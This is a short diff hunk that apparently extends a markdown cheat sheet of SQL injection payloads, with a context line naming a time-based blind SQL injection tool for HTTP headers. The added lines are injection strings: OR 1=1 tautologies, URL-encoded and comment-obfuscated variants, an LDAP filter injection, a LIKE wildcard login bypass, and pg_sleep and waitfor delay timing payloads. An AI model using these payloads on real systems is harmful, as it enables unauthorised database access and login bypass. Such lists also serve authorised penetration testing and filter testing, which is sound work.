@@ -40,6 +40,18 @@ Blisqy - Exploit Time-based blind-SQL injection in HTTP-Headers (MySQL/MariaDB)
 ')) or sleep(5)='
 ;waitfor delay '0:0:5'--
 );waitfor delay '0:0:5'--
+' OR 1=1--
+' OR 1=0--
+%27%20or%201=1
+*(|(object=*))
+)%20or%20('x'='x
+%20or%201=1
+1) or pg_sleep(__TIME__)--
+/**/or/**/1/**/=1
+' or username like '%
+);waitfor delay '0:0:__TIME__'--
+or isNULL(1/0) /*
+x' or 1=1 or 'x'='y
 
 ```
 #### SQLI Automation Bash Scripting Exploit :
